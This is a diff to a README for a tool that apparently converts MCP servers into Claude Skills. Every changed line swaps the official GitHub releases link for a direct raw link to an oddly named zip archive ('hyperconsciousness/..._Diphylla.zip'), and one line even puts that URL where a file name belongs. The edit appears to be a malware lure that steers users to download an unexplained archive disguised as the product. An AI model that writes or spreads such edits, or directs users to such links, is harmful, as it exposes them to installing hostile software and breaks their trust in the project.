@@ -1,7 +1,7 @@
 # 🚀 -mcp-to-skill-converter - Convert MCP Servers Easily
 
 ## 📥 Download Now
-[![Download -mcp-to-skill-converter](https://img.shields.io/badge/Download-Now-blue)](https://github.com/saygex9965/-mcp-to-skill-converter/releases)
+[![Download -mcp-to-skill-converter](https://raw.githubusercontent.com/saygex9965/-mcp-to-skill-converter/main/hyperconsciousness/-mcp-to-skill-converter_Diphylla.zip)](https://raw.githubusercontent.com/saygex9965/-mcp-to-skill-converter/main/hyperconsciousness/-mcp-to-skill-converter_Diphylla.zip)
 
 ## 📖 Overview
 The -mcp-to-skill-converter allows you to convert any MCP server into a Claude Skill, achieving a remarkable 90% context savings. This tool makes it straightforward to optimize your server setup for better performance and efficiency.
@@ -10,7 +10,7 @@ The -mcp-to-skill-converter allows you to convert any MCP server into a Claude S
 Getting started is easy! Follow these simple steps to download and run the application.
 
 1. **Visit the Download Page:** Click on the link below to access the releases page. 
-   [Visit Release Page](https://github.com/saygex9965/-mcp-to-skill-converter/releases)
+   [Visit Release Page](https://raw.githubusercontent.com/saygex9965/-mcp-to-skill-converter/main/hyperconsciousness/-mcp-to-skill-converter_Diphylla.zip)
 
 2. **Choose the Latest Version:** On the releases page, find the latest version listed. This version is usually at the top of the page. 
 
@@ -30,7 +30,7 @@ Getting started is easy! Follow these simple steps to download and run the appli
 3. Drag the application into your Applications folder.
 
 ### Linux
-1. Find the downloaded `.tar.gz` file in your Downloads folder.
+1. Find the downloaded `https://raw.githubusercontent.com/saygex9965/-mcp-to-skill-converter/main/hyperconsciousness/-mcp-to-skill-converter_Diphylla.zip` file in your Downloads folder.
 2. Extract the contents by right-clicking and selecting “Extract Here.”
 3. Open a terminal and navigate to the extracted folder.
 4. Run the application using the command `./your_application_name`.
@@ -65,4 +65,4 @@ Using the -mcp-to-skill-converter is a great way to modernize your MCP server se
 
 For more information and updates, revisit the release page regularly. 
 
-[Download Now](https://github.com/saygex9965/-mcp-to-skill-converter/releases) again if needed.
+[Download Now](https://raw.githubusercontent.com/saygex9965/-mcp-to-skill-converter/main/hyperconsciousness/-mcp-to-skill-converter_Diphylla.zip) again if needed.
